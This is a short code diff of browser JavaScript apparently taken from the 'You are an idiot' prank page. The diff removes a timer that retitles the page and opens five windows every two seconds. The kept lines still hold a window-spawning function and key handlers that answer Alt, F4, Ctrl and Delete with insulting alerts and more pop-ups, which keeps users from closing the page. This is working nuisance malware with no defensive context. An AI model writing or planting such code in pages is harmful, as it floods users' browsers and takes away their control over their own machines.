@@ -28,12 +28,6 @@ function procreate() {
 		openWindow('lol.html');
 	}
 }
-setInterval(function() {
-		changeTitle("Idiot!");
-	for (var i = 0; i < 5; i++) {
-		openWindow('lol.html');
-	}
-},2000)
 function altf4key() { if (event.keyCode == 18 || event.keyCode == 115) { alert("You are an idiot!"); procreate(); } }
 function ctrlkey() { if (event.keyCode == 17) { alert("You are an idiot!"); procreate(); } }
 function delkey() { if (event.keyCode == 46) { alert("You are an idiot!"); procreate(); } }
